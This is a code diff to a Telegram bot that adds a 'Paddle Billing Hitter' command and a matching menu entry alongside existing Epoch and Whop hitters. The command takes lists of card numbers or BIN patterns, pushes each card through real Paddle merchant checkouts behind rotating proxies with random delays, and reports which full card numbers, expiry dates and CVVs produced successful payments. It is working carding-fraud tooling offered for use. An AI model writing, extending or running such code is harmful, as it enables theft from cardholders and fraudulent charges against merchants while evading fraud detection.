@@ -1723,6 +1723,163 @@ async def hitwhop_command(message: types.Message):
         if active_sessions.get(user_id) == session_token:
             del active_sessions[user_id]
 
+@dp.message(Command("hitpad", "hitpaddle", "paddle"))
+async def hitpad_command(message: types.Message):
+    user_id = message.from_user.id
+    
+    if user_id in active_sessions:
+        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
+        return
+
+    if not await ProxyManager.has_proxies(user_id):
+        await message.answer(
+            "⚠️ <b>Proxy Required</b>\n"
+            "<code>Proxy pool is empty. You must load active proxies before hitting.\n"
+            "Load proxies using /proxy or /getproxy.</code>"
+        )
+        return
+
+    raw_tokens = message.text.strip().split()
+    if len(raw_tokens) < 3 and not (len(raw_tokens) == 3 or (len(raw_tokens) == 2 and any(c.isdigit() or c == 'x' for c in raw_tokens[-1]))):
+        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitpad [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hitpad [url] [bin_pattern] [count=10]</code>")
+        return
+        
+    url = raw_tokens[1]
+    payload_tokens = raw_tokens[2:]
+    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
+    
+    cards, err = parse_cards_input(payload_tokens, raw_payload)
+    if err:
+        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
+        return
+
+    status_msg = await message.answer("cooking....")
+    session_token = time.time()
+    active_sessions[user_id] = session_token
+    
+    try:
+        from paddle_hitter import PaddleHitter
+        proxy_data = await ProxyManager.get_random(user_id)
+        
+        card_blocks = []
+        merchant_name = "Paddle Merchant"
+        amount_str = None
+        results = []
+
+        paddle_engine = PaddleHitter(url, proxy_data=proxy_data)
+        for idx, card in enumerate(cards, 1):
+            if active_sessions.get(user_id) != session_token:
+                break
+
+            if idx > 1:
+                await asyncio.sleep(random.uniform(0.5, 1.0))
+
+            res = await paddle_engine.hit(card, idx, user_id)
+            results.append(res)
+            
+            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
+            merchant_name = res.get('merchant') or merchant_name
+            if res.get('amount'):
+                amount_str = res['amount']
+
+            site_domain = extract_clean_site_domain(merchant_name, url)
+
+            if len(cards) > 1:
+                status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
+                resp_str = "Authorised" if res['success'] else (res.get('error') or res.get('decline_code') or "Refused")
+
+                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
+                succ_url_line = extract_success_url_line(res)
+                if succ_url_line:
+                    block += succ_url_line
+
+                card_blocks.append(block)
+
+                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
+                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
+                
+                visible_blocks = card_blocks
+                while len("\n\n".join(visible_blocks)) > 3500 and len(visible_blocks) > 1:
+                    visible_blocks = visible_blocks[1:]
+                blocks_text = "\n\n".join(visible_blocks)
+
+                msg_text = (
+                    f"<b>Paddle Hitter</b>\n\n"
+                    f"{blocks_text}\n\n"
+                    f"{site_line}"
+                    f"{amt_line}"
+                )
+
+                try:
+                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
+                except Exception:
+                    pass
+
+        is_approved = user_id in approved_users_set
+
+        if len(cards) == 1 and results:
+            if status_msg:
+                try: await status_msg.delete()
+                except: pass
+
+            res = results[0]
+            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
+            merchant_name = res.get('merchant') or merchant_name
+            amount_val = res.get('amount') or amount_str or "USD 0.00"
+            site_domain = extract_clean_site_domain(merchant_name, url)
+            merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
+            note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
+
+            if res.get('success'):
+                succ_url = res.get('receipt_url') or res.get('final_url') or res.get('redirect_url')
+                succ_url_line = f"\n<b><i>Success URL</i></b> ➔ {html.escape(str(succ_url))}" if succ_url else ""
+                hit_text = (
+                    f"✅ <b><i>PAYMENT SUCCESSFUL [PADDLE]</i></b>\n"
+                    f"──────────────────────\n"
+                    f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
+                    f"<b><i>Amount</i></b> ➔ {amount_val}\n"
+                    f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
+                    f"<b><i>Time</i></b> ➔ {res.get('response_time', 0):.2f}s"
+                    f"{succ_url_line}\n"
+                    f"──────────────────────"
+                    f"{note_line}"
+                )
+            else:
+                reason_msg = html.escape(str(res.get('error') or res.get('decline_code') or 'refused')[:250])
+                hit_text = (
+                    f"❌ <b><i>PAYMENT UNSUCCESSFUL</i></b>\n"
+                    f"──────────────────────\n"
+                    f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
+                    f"<b><i>Amount</i></b> ➔ {amount_val}\n"
+                    f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
+                    f"<b><i>Response</i></b> ➔ {reason_msg}\n"
+                    f"<b><i>Time</i></b> ➔ {res.get('response_time', 0):.2f}s\n"
+                    f"──────────────────────" + note_line
+                )
+
+            sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
+            if not is_approved:
+                async def auto_del_pad(m):
+                    await asyncio.sleep(30)
+                    try: await m.delete()
+                    except: pass
+                asyncio.create_task(auto_del_pad(sent_msg))
+        elif len(cards) > 1 and not is_approved and status_msg:
+            async def auto_del_pad(m):
+                await asyncio.sleep(30)
+                try: await m.delete()
+                except: pass
+            asyncio.create_task(auto_del_pad(status_msg))
+
+    except Exception as ex:
+        if status_msg:
+            try: await status_msg.delete()
+            except: pass
+        await message.answer(f"❌ <b>Error processing Paddle check:</b>\n<code>{html.escape(str(ex))}</code>")
+    finally:
+        if active_sessions.get(user_id) == session_token:
+            del active_sessions[user_id]
+
 @dp.message(Command("stop"))
 async def stop_command(message: types.Message):
     user_id = message.from_user.id
@@ -2922,7 +3079,9 @@ async def process_menu_hitter(callback: types.CallbackQuery):
         "<b><i>Epoch Billing Hitter</i></b>\n"
         "<code>/hitep [url] [cc|mm|yy|cvv]</code>\n\n"
         "<b><i>Whop Checkout Hitter</i></b>\n"
-        "<code>/hitwhop [url] [cc|mm|yy|cvv]</code>"
+        "<code>/hitwhop [url] [cc|mm|yy|cvv]</code>\n\n"
+        "<b><i>Paddle Billing Hitter</i></b>\n"
+        "<code>/hitpad [url] [cc|mm|yy|cvv]</code>"
     )
     try:
         await callback.message.edit_text(hitter_text, reply_markup=markup)
